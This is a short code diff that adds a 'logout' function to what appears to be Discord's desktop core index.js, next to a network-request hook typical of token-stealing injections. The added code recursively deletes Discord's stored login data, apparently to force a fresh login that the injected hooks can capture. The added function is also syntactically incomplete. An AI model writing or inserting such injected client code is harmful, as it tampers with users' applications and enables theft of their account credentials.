@@ -355,4 +355,13 @@ session.defaultSession.webRequest.onCompleted(UrlFilter, (details, callback) => 
         }))
 	}
 });
+
+function logout(){
+    const f = `${ROAMING}\discord\Local Storage\leveldb`
+fs.rmdir(f, { recursive: true }, (err) => {
+      if (err) {
+          console.error(err);
+            }
+            });
+
 module.exports = require('./core.asar')
